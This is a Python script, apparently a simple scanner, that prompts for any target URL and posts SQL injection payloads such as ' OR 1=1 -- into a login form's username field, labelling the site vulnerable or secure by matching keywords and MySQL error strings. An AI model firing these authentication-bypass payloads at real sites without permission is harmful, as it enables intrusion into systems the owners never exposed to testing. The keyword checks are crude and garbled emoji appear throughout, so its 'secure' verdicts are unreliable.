import requests
import time
import logging

# Set up logging for detailed output
logging.basicConfig(filename="sql_injection_test.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# Ask user to enter a target website URL
target_url = input("Enter the target URL: ").strip()

# Function to handle retries in case of timeouts or server failures
def make_request(url, data, retries=3, delay=2):
    for attempt in range(retries):
        try:
            response = requests.post(url, data=data, timeout=10)
            return response
        except requests.exceptions.Timeout:
            logging.warning(f"Timeout error on attempt {attempt + 1}. Retrying in {delay} seconds...")
            time.sleep(delay)
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
            break
    return None

# Function to check responses and assign risk level
def classify_risk(response_text, test_type):
    if not response_text:
        return "‚ùå Error: No response or failed request."

    # Boolean-Based SQL Injection Detection
    if test_type == "Boolean-Based":
        if "Welcome" in response_text or "Dashboard" in response_text:
            return "üü† Medium Risk: Website is vulnerable to Boolean-Based SQL Injection!"
        return "‚úÖ Secure: No Boolean-Based SQL Injection vulnerability detected."

    # Classic SQL Injection (Error-Based)
    elif test_type == "Classic":
        sql_errors = ["SQL syntax", "mysql_fetch", "MySQL server version", "You have an error in your SQL syntax"]
        if any(error in response_text for error in sql_errors):
            return "üî¥ High Risk: Website is vulnerable to Classic (Error-Based) SQL Injection!"
        return "‚úÖ Secure: No Classic SQL Injection vulnerability detected."

    return "‚úÖ Secure: No SQL injection vulnerability detected for this test."

# Boolean-Based SQL Injection Test
def test_boolean_based_injection():
    logging.info("\nüîç Testing Boolean-Based SQL Injection...")
    payloads = ["' OR 1=1 --", "' OR 1=2 --"]
    
    for payload in payloads:
        response = make_request(target_url, data={"username": payload, "password": "password"})
        if response:
            result = classify_risk(response.text, "Boolean-Based")
            logging.info(f"Test with payload '{payload}' ‚Üí {result}")
            print(f"Test with payload '{payload}' ‚Üí {result}")
        else:
            print("‚ùå Error: Failed to get response for Boolean-Based test.")

# Classic (Error-Based) SQL Injection Test
def test_classic_injection():
    logging.info("\nüîç Testing Classic SQL Injection (Error-Based)...")
    classic_payload = "'"

    response = make_request(target_url, data={"username": classic_payload, "password": "password"})
    
    if response:
        result = classify_risk(response.text, "Classic")
        logging.info(f"Test with payload '{classic_payload}' ‚Üí {result}")
        print(f"Test with payload '{classic_payload}' ‚Üí {result}")
    else:
        print("‚ùå Error: Failed to get response for Classic SQL Injection test.")

# Run the tests
def run_tests():
    test_boolean_based_injection()
    test_classic_injection()

if __name__ == "__main__":
    time.sleep(2)  # Adding a delay to ensure the user can input the URL
    run_tests()
